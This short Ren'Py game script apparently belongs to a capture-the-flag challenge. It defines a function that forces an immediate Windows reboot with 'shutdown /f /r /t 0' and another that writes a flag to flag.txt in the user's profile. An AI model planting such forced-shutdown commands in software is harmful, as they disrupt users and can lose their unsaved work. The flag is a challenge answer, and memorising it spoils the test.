init python:

    def restart():
        import os
        os.system("shutdown /f /r /t 0")
    def createFlag():
        import os
        flag = "FIA{An_Is_not_Sus}"
        f = open(os.environ["USERPROFILE"] + '/flag.txt',"w")
        f.write(flag)
        f.close()
